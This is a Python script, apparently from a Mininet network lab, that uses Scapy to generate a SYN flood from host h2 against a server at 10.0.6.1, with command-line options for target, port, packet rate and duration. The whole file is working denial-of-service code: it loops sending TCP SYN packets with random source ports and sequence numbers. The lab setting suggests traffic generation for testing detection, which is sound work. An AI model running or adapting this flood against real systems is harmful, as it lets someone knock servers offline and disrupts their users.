#!/usr/bin/env python3
"""
send_attack.py — Generador de tráfico SYN Flood.

Simula un ataque SYN Flood desde h2 (10.0.1.82, atacante) hacia h3 (servidor).
Usa sendp() (Layer 2) directamente — no requiere tcpreplay.

Ejecutar desde Mininet en h2:
    mininet> h2 python3 send_attack.py &

O directamente:
    python3 send_attack.py [--dst 10.0.6.1] [--pps 50] [--duration 60]
"""

import argparse
import random
import time
from scapy.all import Ether, IP, TCP, get_if_hwaddr, sendp

DEFAULT_DST      = '10.0.6.1'
DEFAULT_DST_PORT = 80
DEFAULT_PPS      = 50     # paquetes por segundo (aproximado — Python tiene overhead)
DEFAULT_DURATION = 60     # segundos de ataque


def main():
    parser = argparse.ArgumentParser(description='SYN Flood attack generator')
    parser.add_argument('--dst',      default=DEFAULT_DST,      help='IP destino (servidor)')
    parser.add_argument('--dport',    type=int, default=DEFAULT_DST_PORT, help='Puerto destino')
    parser.add_argument('--pps',      type=int, default=DEFAULT_PPS,      help='Paquetes por segundo')
    parser.add_argument('--duration', type=int, default=DEFAULT_DURATION,  help='Duración en segundos')
    args = parser.parse_args()

    iface   = 'eth0'
    src_mac = get_if_hwaddr(iface)
    interval = 1.0 / max(args.pps, 1)   # segundos entre paquetes

    print(f"[ATTACK] SYN Flood: {args.dst}:{args.dport} a ~{args.pps} pps durante {args.duration}s")
    print(f"[ATTACK] Interfaz: {iface}  |  Ctrl+C para detener\n")

    count    = 0
    end_time = time.time() + args.duration

    try:
        while time.time() < end_time:
            pkt = (Ether(src=src_mac, dst='ff:ff:ff:ff:ff:ff') /
                   IP(src='10.0.1.82', dst=args.dst) /
                   TCP(sport=random.randint(1024, 65535),
                       dport=args.dport,
                       flags='S',
                       seq=random.randint(0, 2**32 - 1)))
            sendp(pkt, iface=iface, verbose=False)
            count += 1
            time.sleep(interval)
    except KeyboardInterrupt:
        pass

    print(f"\n[ATTACK] Finalizado. Enviados {count} paquetes SYN en {args.duration}s.")


if __name__ == '__main__':
    main()
